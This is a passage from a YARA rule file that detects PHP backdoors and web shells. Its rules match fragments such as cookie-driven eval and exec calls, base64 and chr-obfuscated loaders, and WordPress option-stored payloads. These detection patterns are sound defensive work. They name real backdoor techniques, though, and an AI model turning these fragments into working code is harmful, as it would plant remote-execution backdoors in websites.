        $trigger and PR00113 and PR01428 and PR01021 and PR01604 and PR01605
}

private rule PR01606 : trigger
{
    strings:
        $ps0 = "(strlen($file_contents)"
    condition:
        $ps0
}

private rule PR01607 : trigger
{
    strings:
        $ps0 = "@file_get_contents($"
    condition:
        $ps0
}

rule php_backdoor_curl_072_02 : backdoor
{
    strings:
        $trigger = "].@$_SERVER["
    condition:
        $trigger and PR00113 and PR01428 and PR01606 and PR01021 and PR01607
}

private rule PR01608 : trigger
{
    strings:
        $ps0 = ")!==false||strpos($"
    condition:
        $ps0
}

rule php_backdoor_curl_072_03 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00113 and PR01428 and PR01606 and PR01021 and PR01608 and PR01605
}

private rule PR01609 : trigger
{
    strings:
        $ps0 = "if(md5(@$_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_curl_073 : backdoor
{
    strings:
        $trigger = "base64_decode($_REQUEST"
    condition:
        $trigger and PR00435 and PR01609
}

private rule PR01610 : trigger
{
    strings:
        $ps0 = "hex2bin(strrev("
    condition:
        $ps0
}

rule php_backdoor_curl_074 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR01610 and PR01401
}

private rule PR01611 : trigger
{
    strings:
        $ps0 = "@$"
    condition:
        $ps0
}

private rule PR01612 : trigger
{
    strings:
        $ps0 = ";die();"
    condition:
        $ps0
}

private rule PR01613 : trigger
{
    strings:
        $ps0 = ".$"
    condition:
        $ps0
}

private rule PR01614 : trigger
{
    strings:
        $ps0 = "\".\""
    condition:
        $ps0
}

rule php_backdoor_curl_076 : backdoor
{
    strings:
        $trigger = "CURLOPT_RETURNTRANSFER"
    condition:
        $trigger and PR01611 and PR01612 and PR01613 and PR01614 and PR00719
}

private rule PR01615 : trigger
{
    strings:
        $ps0 = "(){return __FILE__;}"
    condition:
        $ps0
}

private rule PR01616 : trigger
{
    strings:
        $ps0 = "curl_exec ($"
    condition:
        $ps0
}

rule php_backdoor_curl_077 : backdoor
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR01615 and PR01021 and PR01616 and PR01569 and PR01431
}

private rule PR01617 : trigger
{
    strings:
        $ps0 = "curl_exec("
    condition:
        $ps0
}

rule php_backdoor_curl_078 : backdoor
{
    strings:
        $trigger = "trim($_GET["
    condition:
        $trigger and PR01617 and PR00029 and PR01436
}

private rule PR01618 : trigger
{
    strings:
        $ps0 = "basename(__FILE__),http_get_contents("
    condition:
        $ps0
}

rule php_backdoor_curl_079 : backdoor
{
    strings:
        $trigger = "curl_init("
    condition:
        $trigger and PR00435 and PR01618
}

// MANUAL FIX NECESSARY
private rule PR01619 : trigger
{
    strings:
        $ps0 = "and md5(md5($"
    condition:
        $ps0
}

rule php_backdoor_curl_080 : backdoor
{
    strings:
        $trigger = "(__FILE__)"
        $php_backdoor_curl_080_r0 = /\$[\w]+\[[\d]+\]+[\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\./
    condition:
        $trigger and PR01619 and PR01016 and $php_backdoor_curl_080_r0
}

rule php_backdoor_cve_001 : backdoor
{
    strings:
        $trigger = ".@$_(cve("
    condition:
        $trigger and PR00675
}

rule php_backdoor_CyberNetic_001 : backdoor
{
    strings:
        $trigger = "function doXploitVB($cnf,$html){"
    condition:
        $trigger and PR00013
}

rule php_backdoor_darkshell_001 : backdoor
{
    strings:
        $trigger = "echo \"<table><form action = '\".$current. \"&mode=port_scan'"
    condition:
        $trigger and PR00013
}

private rule PR01620 : trigger
{
    strings:
        $ps0 = "port_range=$_POST[$_GET{"
    condition:
        $ps0
}

rule php_backdoor_darkshell_001_02 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01620
}

rule php_backdoor_db_shell_002 : backdoor
{
    strings:
        $trigger = "$wp_optimize_func=create_function('',get_option('wp_optimize'));$wp_optimize_func();"
    condition:
        $trigger
}

private rule PR01621 : trigger
{
    strings:
        $ps0 = "include('../wp-config.php');"
    condition:
        $ps0
}

rule php_backdoor_db_shell_004 : backdoor
{
    strings:
        $trigger = "UPDATE $table SET post_content='$newCode', post_title='$newTitle' WHERE id=$id"
    condition:
        $trigger and PR01621
}

private rule PR01622 : trigger
{
    strings:
        $ps0 = ": function feedmtimeFolder($"
    condition:
        $ps0
}

private rule PR01623 : trigger
{
    strings:
        $ps0 = "REQUEST"
    condition:
        $ps0
}

private rule PR01624 : trigger
{
    strings:
        $ps0 = ": function do_mysql_getemall($"
    condition:
        $ps0
}

rule php_backdoor_db_shell_005 : backdoor
{
    strings:
        $trigger = "isset("
    condition:
        $trigger and PR01622 and PR00029 and PR01623 and PR01624
}

rule php_backdoor_dbload_001 : backdoor
{
    strings:
        $trigger = "function page_options() { $option = get_option('page_option'); $opt=unserialize($option);"
    condition:
        $trigger and PR01483
}

rule php_backdoor_dbload_002 : backdoor
{
    strings:
        $trigger = "(ge'.'t_option("
    condition:
        $trigger
}

private rule PR01625 : trigger
{
    strings:
        $ps0 = "$_z=create_function(\"\",$z); @$_z(); }"
    condition:
        $ps0
}

rule php_backdoor_dbload_004 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR01625 and PR01422
}

private rule PR01626 : trigger
{
    strings:
        $ps0 = "@ini_set('cgi.fix_pathinfo', 1);"
    condition:
        $ps0
}

private rule PR01627 : trigger
{
    strings:
        $ps0 = "if ($_GET['ping']) {"
    condition:
        $ps0
}

rule php_backdoor_dbload_005 : backdoor
{
    strings:
        $trigger = "assthru"
    condition:
        $trigger and PR01626 and PR01627
}

// MANUAL FIX NECESSARY
private rule PR01628 : trigger
{
    strings:
        $ps0 = "get_option"
    condition:
        $ps0
}

private rule PR01629 : trigger
{
    strings:
        $ps0 = "null"
    condition:
        $ps0
}

rule php_backdoor_dbload_006 : backdoor
{
    strings:
        $trigger = "@$"
        $php_backdoor_dbload_006_r0 = /\$[\w]+[\s]*=[\s]*get_option\(.[\w]+.[\s]*\);[\s]*if[\s]*\([\s]*isset[\s]*\([\s]*\$[\w]+\[.[\w]+.\][\)\s]+@\$[\w]+\[.[\w]+.\]\([\s]*null/
    condition:
        $trigger and PR01628 and PR01629 and PR00397 and $php_backdoor_dbload_006_r0
}

rule php_backdoor_dbload_007 : backdoor
{
    strings:
        $trigger = "add_action( 'init', create_function( '', @join( array_map( \"base64_decode\", json_decode( get_option( $table_prefix . \""
    condition:
        $trigger
}

private rule PR01630 : trigger
{
    strings:
        $ps0 = "(array_key_exists('eval', $payload"
    condition:
        $ps0
}

rule php_backdoor_dbload_008 : backdoor
{
    strings:
        $trigger = "$key"
    condition:
        $trigger and PR01630 and PR01422
}

private rule PR01631 : trigger
{
    strings:
        $ps0 = "file_get_contents($upUrl, false, $context);"
    condition:
        $ps0
}

private rule PR01632 : trigger
{
    strings:
        $ps0 = "site_url() . '&ur=' . admin_url('admin-ajax.php?action="
    condition:
        $ps0
}

rule php_backdoor_dbload_009 : backdoor
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR01631 and PR01632
}

// MANUAL FIX NECESSARY
rule php_backdoor_dbload_010 : backdoor
{
    strings:
        $trigger = "get_option"
        $php_backdoor_dbload_010_r0 = /create_function\([\s]*..,[\s]*@join\([\s]*..n.,[\s]*array_map\([\s]*.base64_decode/
    condition:
        $trigger and PR01483 and $php_backdoor_dbload_010_r0
}

private rule PR01633 : trigger
{
    strings:
        $ps0 = "eval($dec);"
    condition:
        $ps0
}

rule php_backdoor_decryptS0_001 : backdoor
{
    strings:
        $trigger = "decrypt"
    condition:
        $trigger and PR01633
}

private rule PR01634 : trigger
{
    strings:
        $ps0 = "function recurDir4($dir4,$chmod4='')"
    condition:
        $ps0
}

rule php_backdoor_delloginfile_001 : backdoor
{
    strings:
        $trigger = "function delloginfile() {"
    condition:
        $trigger and PR01458 and PR01634
}

private rule PR01635 : trigger
{
    strings:
        $ps0 = "/*versio:"
    condition:
        $ps0
}

rule php_backdoor_determinator_002 : backdoor
{
    strings:
        $trigger = "REQUEST"
    condition:
        $trigger and PR01635 and PR00029
}

private rule PR01636 : trigger
{
    strings:
        $ps0 = "*/ $GLOBALS"
    condition:
        $ps0
}

private rule PR01637 : trigger
{
    strings:
        $ps0 = "pack("
    condition:
        $ps0
}

rule php_backdoor_determinator_003 : backdoor
{
    strings:
        $trigger = "versio:"
    condition:
        $trigger and PR01636 and PR01637
}

private rule PR01638 : trigger
{
    strings:
        $ps0 = "/e\", "
    condition:
        $ps0
}

private rule PR01639 : trigger
{
    strings:
        $ps0 = ")){$GLOBALS["
    condition:
        $ps0
}

rule php_backdoor_determinator_004 : backdoor
{
    strings:
        $trigger = "versio:"
    condition:
        $trigger and PR01638 and PR01639 and PR01637
}

rule php_backdoor_determinator_005 : backdoor
{
    strings:
        $trigger = "ZnVuY3Rpb24gdEx2MmFRQmdQN2VNalJzQWdnT2l"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR01640 : trigger
{
    strings:
        $ps0 = "aWYgKCFkZWZpbmVkKCJkZXRlcm1pbmF0b3IiKS"
    condition:
        $ps0
}

rule php_backdoor_determinator_006 : backdoor
{
    strings:
        $trigger = "versio:"
    condition:
        $trigger and PR01640 and PR01637
}

// MANUAL FIX NECESSARY
rule php_backdoor_determinator_007 : backdoor
{
    strings:
        $trigger = "versio:"
        $php_backdoor_determinator_007_r0 = /\*versio:[^\*]+\*. \$GLOBALS\[.\S+.\][^;]+;\s*if +\(!function_exists\(.\w+.\)\)\{function \w+[^;]+\$GLOBALS\[/
    condition:
        $trigger and PR01637 and $php_backdoor_determinator_007_r0
}

rule php_backdoor_dgreusdi_001 : backdoor
{
    strings:
        $trigger = "intval(__LINE__) * 337;\""
    condition:
        $trigger and PR00029
}

private rule PR01641 : trigger
{
    strings:
        $ps0 = "return @unserialize(screen_submission($data, $key)"
    condition:
        $ps0
}

rule php_backdoor_dgreusdi_001_02 : backdoor
{
    strings:
        $trigger = "eval"
    condition:
        $trigger and PR00391 and PR01465 and PR01641
}

private rule PR01642 : trigger
{
    strings:
        $ps0 = "ck"
    condition:
        $ps0
}

rule php_backdoor_dgreusdi_002 : backdoor
{
    strings:
        $trigger = "PD9waHAgY3JlYXRlX2Z1bmN0aW9uKCcnLCBiYXNlNjRfZG"
    condition:
        $trigger and PR01642
}

rule php_backdoor_dgreusdi_002_02 : backdoor
{
    strings:
        $trigger = "create_function('', base64_decode('fSBpZighZGVmaW5l"
    condition:
        $trigger
}

rule php_backdoor_dgreusdi_003 : backdoor
{
    strings:
        $trigger = "$dgreusdi = intval(__LINE__) *"
    condition:
        $trigger and PR00435
}

private rule PR01643 : trigger
{
    strings:
        $ps0 = "intval(__LINE__)"
    condition:
        $ps0
}

rule php_backdoor_dgreusdi_004 : backdoor
{
    strings:
        $trigger = "base64_decode($"
    condition:
        $trigger and PR01643 and PR01468 and PR01480
}

rule php_backdoor_Dhanush_001 : backdoor
{
    strings:
        $trigger = "$my_shell_style"
    condition:
        $trigger
}

rule php_backdoor_diveshell_001 : backdoor
{
    strings:
        $trigger = "<title>Dive Shell - Emperor"
    condition:
        $trigger
}

rule php_backdoor_do_backdoor_001 : backdoor
{
    strings:
        $trigger = "function do_backdoor_wp($domain_path"
    condition:
        $trigger and PR01479
}

private rule PR01644 : trigger
{
    strings:
        $ps0 = "htaccess_"
    condition:
        $ps0
}

rule php_backdoor_do_backdoor_002 : backdoor
{
    strings:
        $trigger = "function do_backdoor($root_path"
    condition:
        $trigger and PR00435 and PR01644
}

rule php_backdoor_dodo_zip_001 : backdoor
{
    strings:
        $trigger = "<input name=\"todir\" type=\"text\" id=\"todir\" value=\"__dodo__\" size=\"15\">"
    condition:
        $trigger and PR00265
}

rule php_backdoor_dodo_zip_001_02 : backdoor
{
    strings:
        $trigger = "<input name=\"todir\" type=\"text\" id=\"todir\" value=\"__dodo__\" size=\"15\">"
    condition:
        $trigger and PR00507
}

private rule PR01645 : trigger
{
    strings:
        $ps0 = "AF client v2.0 already installed!<hr><hr>"
    condition:
        $ps0
}

private rule PR01646 : trigger
{
    strings:
        $ps0 = "file_put_contents($put, $data)"
    condition:
        $ps0
}

rule php_backdoor_domen_001 : backdoor
{
    strings:
        $trigger = "if (file_exists($file_name)"
    condition:
        $trigger and PR01645 and PR01646
}

private rule PR01647 : trigger
{
    strings:
        $ps0 = "EcHoLL"
    condition:
        $ps0
}

rule php_backdoor_echoll_001 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR01647
}

private rule PR01648 : trigger
{
    strings:
        $ps0 = "move_uploaded_file"
    condition:
        $ps0
}

private rule PR01649 : trigger
{
    strings:
        $ps0 = "EncodeExplorer::getConfig"
    condition:
        $ps0
}

rule php_backdoor_encode_explorer_001 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01649
}

private rule PR01650 : trigger
{
    strings:
        $ps0 = "$_g_g_[6]('', $g___g_);"
    condition:
        $ps0
}

rule php_backdoor_encrypted_001 : backdoor
{
    strings:
        $trigger = "g__g_"
    condition:
        $trigger and PR00391 and PR01650
}

private rule PR01651 : trigger
{
    strings:
        $ps0 = "<input type=\"text\" name=\"g__g_\" value=\"\"/>"
    condition:
        $ps0
}

rule php_backdoor_encrypted_001_02 : backdoor
{
    strings:
        $trigger = "value=\"&amp;\""
    condition:
        $trigger and PR00039 and PR01651
}

private rule PR01652 : trigger
{
    strings:
        $ps0 = "])%256)];$"
    condition:
        $ps0
}

private rule PR01653 : trigger
{
    strings:
        $ps0 = "chr(ord($"
    condition:
        $ps0
}

rule php_backdoor_encrypted_002 : backdoor
{
    strings:
        $trigger = "eval"
    condition:
        $trigger and PR01652 and PR01653 and PR00391 and PR01422
}

rule php_backdoor_encrypted_003 : backdoor
{
    strings:
        $trigger = "}=@unserialize(sh_decrypt(@base64_decode(${$"
    condition:
        $trigger and PR01653 and PR00391 and PR01466
}

private rule PR01654 : trigger
{
    strings:
        $ps0 = "function_exists"
    condition:
        $ps0
}

private rule PR01655 : trigger
{
    strings:
        $ps0 = "strrev('edoced_46esab')"
    condition:
        $ps0
}

private rule PR01656 : trigger
{
    strings:
        $ps0 = "= $wpdb->get_var(\"SELECT `option_value` FROM {$wpdb->options} WHERE `option_name`="
    condition:
        $ps0
}

rule php_backdoor_encrypted_004 : backdoor
{
    strings:
        $trigger = "mcrypt_decrypt"
    condition:
        $trigger and PR01654 and PR01655 and PR01656 and PR00397
}

private rule PR01657 : trigger
{
    strings:
        $ps0 = "akRNajlvNzduQUZrY"
    condition:
        $ps0
}

private rule PR01658 : trigger
{
    strings:
        $ps0 = "0O"
    condition:
        $ps0
}

rule php_backdoor_encrypted_005 : backdoor
{
    strings:
        $trigger = "return openssl_decrypt($"
    condition:
        $trigger and PR01657 and PR00029 and PR01422 and PR01658
}

private rule PR01659 : trigger
{
    strings:
        $ps0 = "eval(base64_decode("
    condition:
        $ps0
}

rule php_backdoor_encrypted_006 : backdoor
{
    strings:
        $trigger = "FD1FJg167z2fvvRfdNJBFTogsCltSORac35"
    condition:
        $trigger and PR00265 and PR01659
}

rule php_backdoor_encrypted_007 : backdoor
{
    strings:
        $trigger = ").(round(0+16+16)*round(0+1+1))._"
    condition:
        $trigger and PR01330 and PR00046
}

private rule PR01660 : trigger
{
    strings:
        $ps0 = "execute($"
    condition:
        $ps0
}

rule php_backdoor_encrypted_008 : backdoor
{
    strings:
        $trigger = "openssl_decrypt(base64_decode($output), 'AES-256-CBC', base64_decode($"
    condition:
        $trigger and PR01660
}

private rule PR01661 : trigger
{
    strings:
        $ps0 = "=eval(chr("
    condition:
        $ps0
}

rule php_backdoor_eval_chr_001 : backdoor
{
    strings:
        $trigger = "if(!isset($_REQUEST[chr("
    condition:
        $trigger and PR01661
}

private rule PR01662 : trigger
{
    strings:
        $ps0 = "]}.=chr(ord(${${\""
    condition:
        $ps0
}

rule php_backdoor_eval_chr_002 : backdoor
{
    strings:
        $trigger = "eval(${$"
    condition:
        $trigger and PR01662 and PR00634 and PR01016
}

private rule PR01663 : trigger
{
    strings:
        $ps0 = "eNqVVoty4sYS/RXWRQVUJo4khEAhyl0"
    condition:
        $ps0
}

rule php_backdoor_eval_chr_004 : backdoor
{
    strings:
        $trigger = ".chr"
    condition:
        $trigger and PR01663
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_chr_005 : backdoor
{
    strings:
        $trigger = "'e'.'d'.'o'.'l'.'p'.'m'.'i'"
        $php_backdoor_eval_chr_005_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and PR01350 and PR01396 and $php_backdoor_eval_chr_005_r0
}

// MANUAL FIX NECESSARY
private rule PR01664 : trigger
{
    strings:
        $ps0 = "chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115).chr(40)"
    condition:
        $ps0
}

rule php_backdoor_eval_chr_006 : backdoor
{
    strings:
        $trigger = "chr(115).chr(121).chr(115).chr(95).chr(103).chr(101).chr(116).chr(95).chr(116).chr(101).chr(109).chr(112).chr(95)"
        $php_backdoor_eval_chr_006_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and PR01664 and $php_backdoor_eval_chr_006_r0
}

private rule PR01665 : trigger
{
    strings:
        $ps0 = "=urldecode("
    condition:
        $ps0
}

rule php_backdoor_eval_chr_007 : backdoor
{
    strings:
        $trigger = "substr(md5(substr($"
    condition:
        $trigger and PR01480 and PR01665 and PR01550
}

private rule PR01666 : trigger
{
    strings:
        $ps0 = "header(\"HTTP/1.0 404 Not Found\");"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_002 : backdoor
{
    strings:
        $trigger = "(@$_COOKIE["
    condition:
        $trigger and PR01461 and PR01666
}

rule php_backdoor_eval_COOKIE_004 : backdoor
{
    strings:
        $trigger = "*/extract($_COOKIE);/*"
    condition:
        $trigger
}

rule php_backdoor_eval_COOKIE_004_02 : backdoor
{
    strings:
        $trigger = "extract($_COOKIE);"
    condition:
        $trigger
}

private rule PR01667 : trigger
{
    strings:
        $ps0 = "*/extract($_COOKIE);/*"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_004_03 : backdoor
{
    strings:
        $trigger = "&&@$"
    condition:
        $trigger and PR01667
}

private rule PR01668 : trigger
{
    strings:
        $ps0 = "extract($_COOKIE"
    condition:
        $ps0
}

private rule PR01669 : trigger
{
    strings:
        $ps0 = "if(!empty($_COOKIE['strlen']) && md5($_COOKIE['x"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_004_04 : backdoor
{
    strings:
        $trigger = "* NOTICE OF LICENSE"
    condition:
        $trigger and PR01668 and PR01669
}

private rule PR01670 : trigger
{
    strings:
        $ps0 = "]).@$_($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_005 : backdoor
{
    strings:
        $trigger = "if(md5(@$_COOKIE["
    condition:
        $trigger and PR01670
}

private rule PR01671 : trigger
{
    strings:
        $ps0 = "error_reporting(0);if(isset($_COOKIE["
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_006 : backdoor
{
    strings:
        $trigger = "function ob_sh($buffer){$buffer = preg_replace(\"@<!--(.*?)-->@si\",\"\",$buffer)"
    condition:
        $trigger and PR01671
}

private rule PR01672 : trigger
{
    strings:
        $ps0 = "{error_reporting(0);@array_map"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_007 : backdoor
{
    strings:
        $trigger = "if(@$_COOKIE[\""
    condition:
        $trigger and PR01672
}

private rule PR01673 : trigger
{
    strings:
        $ps0 = "$outbuf=\"\";$outstr=\"\";exec(base64_decode($_COOKIE["
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_008 : backdoor
{
    strings:
        $trigger = "eval"
    condition:
        $trigger and PR01673
}

private rule PR01674 : trigger
{
    strings:
        $ps0 = "]])){eval(${$"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_009 : backdoor
{
    strings:
        $trigger = "--><?php"
    condition:
        $trigger and PR01674 and PR01073
}

// MANUAL FIX NECESSARY
private rule PR01675 : trigger
{
    strings:
        $ps0 = "array_shift($"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_011 : backdoor
{
    strings:
        $trigger = "unserialize"
        $php_backdoor_eval_COOKIE_011_r0 = /\$[\w]+[\s]*=[\s]*\"[\w]+\";[\s]*foreach[\s]*\([\s]*\$_COOKIE as \$[^\{]+\{[\s]*if[\s]*\([\s]*\$[\w]+ == \$[\w]+[\s]*\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*base64_decode/
    condition:
        $trigger and PR00391 and PR01422 and PR01675 and $php_backdoor_eval_COOKIE_011_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_COOKIE_011_02 : backdoor
{
    strings:
        $trigger = "end($"
        $php_backdoor_eval_COOKIE_011_02_r0 = /\$[\w]+[\s]*=[\s]*\$_COOKIE;[\s]*foreach[\s]*\([\s]*\$[\w]+[\s]*as \$[\w]+ => \$[\w]+[\s]*\)[\s]*\{[\s]*if[\s]*\([\s]*\$[\w]+ == \"/
    condition:
        $trigger and PR01543 and PR00391 and PR01422 and $php_backdoor_eval_COOKIE_011_02_r0
}

// MANUAL FIX NECESSARY
private rule PR01676 : trigger
{
    strings:
        $ps0 = "array_pop($"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_011_03 : backdoor
{
    strings:
        $trigger = "echo @$"
        $php_backdoor_eval_COOKIE_011_03_r0 = /\$[\w]+ = \"[^;]+;[\s]*\$[\w]+[\s]*=[\s]*\$_COOKIE;[\s]*foreach[\s]*\([\s]*\$[\w]+ as \$[\w]+ => \$[\w]+[\s]*\)[\s]*\{[\s]*if/
    condition:
        $trigger and PR01676 and PR00391 and PR01422 and $php_backdoor_eval_COOKIE_011_03_r0
}

private rule PR01677 : trigger
{
    strings:
        $ps0 = "(isset($_GET[\"cookie\"]))"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_012 : backdoor
{
    strings:
        $trigger = "echo 'cookie="
    condition:
        $trigger and PR01677
}

rule php_backdoor_eval_COOKIE_013 : backdoor
{
    strings:
        $trigger = "$content =  remove_tags(_dl($_COOKIE["
    condition:
        $trigger and PR01514
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_COOKIE_014 : backdoor
{
    strings:
        $trigger = "<?php @$_COOKIE"
        $php_backdoor_eval_COOKIE_014_r0 = /@\$_COOKIE\[[^]]+\]\(\$_COOKIE\[[^]]+\]\);/
    condition:
        $trigger and $php_backdoor_eval_COOKIE_014_r0
}

// MANUAL FIX NECESSARY
private rule PR01678 : trigger
{
    strings:
        $ps0 = "]($_"
    condition:
        $ps0
}

private rule PR01679 : trigger
{
    strings:
        $ps0 = "])){$_COOKIE"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_015 : backdoor
{
    strings:
        $trigger = "isset"
        $php_backdoor_eval_COOKIE_015_r0 = /isset[^(]*\([^$]*\$_COOKIE\[[^{]+\{[^$]*\$_COOKIE\[[^]]+\]\(\$_COOKIE/
    condition:
        $trigger and PR01678 and PR01679 and $php_backdoor_eval_COOKIE_015_r0
}

rule php_backdoor_eval_COOKIE_016 : backdoor
{
    strings:
        $trigger = "extract($_COOKIE);@$"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR01680 : trigger
{
    strings:
        $ps0 = "var_dump"
    condition:
        $ps0
}

private rule PR01681 : trigger
{
    strings:
        $ps0 = "_COOKIE;"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_017 : backdoor
{
    strings:
        $trigger = "array_pop"
        $php_backdoor_eval_COOKIE_017_r0 = /\$[\w]+[\s]*=[\s]*array_pop\([\s]*\$[\w]+[\s]*\);[\s]*var_dump\([\s]*\$[\w]+\([\s]*\$[\w]+[\s]*,[\s]*\$[\w]+\)[\s]*\);/
    condition:
        $trigger and PR01680 and PR01422 and PR01681 and $php_backdoor_eval_COOKIE_017_r0
}

rule php_backdoor_eval_COOKIE_018 : backdoor
{
    strings:
        $trigger = "$path_upload_file = $dir . \"/\" . GenerateFilename();"
    condition:
        $trigger and PR00435
}

// MANUAL FIX NECESSARY
private rule PR01682 : trigger
{
    strings:
        $ps0 = "in_array(gettype($"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_020 : backdoor
{
    strings:
        $trigger = ").count($"
        $php_backdoor_eval_COOKIE_020_r0 = /\$[\w]+[\s]*=[\s]*\$_COOKIE;[\s]*[^&]+(&&[\s]*)*in_array\(gettype\(\$[\w]+\)[\s]*\.[\s]*count[^;]+\(\)\)[^;]*;[\s]*(\}[\s]*)*/
    condition:
        $trigger and PR01454 and PR01682 and $php_backdoor_eval_COOKIE_020_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_COOKIE_020_02 : backdoor
{
    strings:
        $trigger = ").count($"
        $php_backdoor_eval_COOKIE_020_02_r0 = /\{[\s]*echo[^;]+;[\s]*exit[^;]*;[\s]*\}/
    condition:
        $trigger and PR01454 and PR01682 and $php_backdoor_eval_COOKIE_020_02_r0
}

private rule PR01683 : trigger
{
    strings:
        $ps0 = "])){die(md5("
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_020_03 : backdoor
{
    strings:
        $trigger = ").count($"
    condition:
        $trigger and PR01683 and PR01454 and PR01682
}

private rule PR01684 : trigger
{
    strings:
        $ps0 = "time())"
    condition:
        $ps0
}

private rule PR01685 : trigger
{
    strings:
        $ps0 = "));$"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_020_04 : backdoor
{
    strings:
        $trigger = "if(in_array(gettype($"
    condition:
        $trigger and PR01684 and PR01497 and PR01685
}

private rule PR01686 : trigger
{
    strings:
        $ps0 = "]-time())>0)&&@$"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_020_05 : backdoor
{
    strings:
        $trigger = ").count($"
    condition:
        $trigger and PR01686 and PR01454 and PR01682
}

private rule PR01687 : trigger
{
    strings:
        $ps0 = ") { if (in_array(gettype($"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_020_06 : backdoor
{
    strings:
        $trigger = ").count($"
    condition:
        $trigger and PR01454 and PR01687
}

private rule PR01688 : trigger
{
    strings:
        $ps0 = "if(isset($_COOKIE"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_020_07 : backdoor
{
    strings:
        $trigger = ").count($"
    condition:
        $trigger and PR01454 and PR01688 and PR01682
}

private rule PR01689 : trigger
{
    strings:
        $ps0 = "\\x73\\x74\\x72\\x5f\\x72\\x6f\\x74\\x31\\x33"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_020_08 : backdoor
{
    strings:
        $trigger = "${\"\\x5f\\x43\\x4f\\x4f\\x4b\\x49\\x45\"};@(count($"
    condition:
        $trigger and PR01689
}

// MANUAL FIX NECESSARY
private rule PR01690 : trigger
{
    strings:
        $ps0 = "$_COOKIE"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_020_09 : backdoor
{
    strings:
        $trigger = "in_array"
        $php_backdoor_eval_COOKIE_020_09_r0 = /\$[\w]+[\s]*=[\s]*\$_COOKIE[\s]*;[\s]*\([\s]*count[\s]*\([\s]*\$[\w]+[\s]*\)[\s]*==[\s]*\([^\(]+&&[\s]*in_array[\s]*\([\s]*gettype[^;]+:[\s]*\$[\w]+[\s]*;[\s]*/
    condition:
        $trigger and PR01474 and PR01690 and $php_backdoor_eval_COOKIE_020_09_r0
}

rule php_backdoor_eval_COOKIE_020_10 : backdoor
{
    strings:
        $trigger = "(in_array(gettype($"
    condition:
        $trigger and PR01684 and PR01497 and PR01685 and PR01392
}

rule php_backdoor_eval_COOKIE_020_11 : backdoor
{
    strings:
        $trigger = "${\"\\x5f\\x43\\x4f\\x4f\\x4b\\x49\\x45\"};@(c"
    condition:
        $trigger and PR00092 and PR01689
}

// MANUAL FIX NECESSARY
private rule PR01691 : trigger
{
    strings:
        $ps0 = "(''"
    condition:
        $ps0
}

private rule PR01692 : trigger
{
    strings:
        $ps0 = "();"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_021 : backdoor
{
    strings:
        $trigger = "].$"
        $php_backdoor_eval_COOKIE_021_r0 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*'[^']+';[^\n]+\/\*[^\n]+\*\/\$[^\n]+\/\*[^\n]+\$[\w]+\(\);[^\n]*}?/
    condition:
        $trigger and PR01691 and PR01692 and $php_backdoor_eval_COOKIE_021_r0
}

rule php_backdoor_eval_COOKIE_022 : backdoor
{
    strings:
        $trigger = "echo $fn(base64_decode($_COOKIE[$"
    condition:
        $trigger and PR01514
}

rule php_backdoor_eval_COOKIE_024 : backdoor
{
    strings:
        $trigger = "$wp_locale = @$_COOKIE"
    condition:
        $trigger
}

private rule PR01693 : trigger
{
    strings:
        $ps0 = "gzuncompress"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_025 : backdoor
{
    strings:
        $trigger = "<?php $o=<<<'EEEEEE"
    condition:
        $trigger and PR01693
}

private rule PR01694 : trigger
{
    strings:
        $ps0 = "@eval($_COOKIE["
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_027 : backdoor
{
    strings:
        $trigger = "if(@md5($_COOKIE["
    condition:
        $trigger and PR01694
}

private rule PR01695 : trigger
{
    strings:
        $ps0 = "(@isset($_COOKIE["
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_028 : backdoor
{
    strings:
        $trigger = "@array_map(\"show\", @array($_COOKIE["
    condition:
        $trigger and PR01460 and PR01695
}

// MANUAL FIX NECESSARY
private rule PR01696 : trigger
{
    strings:
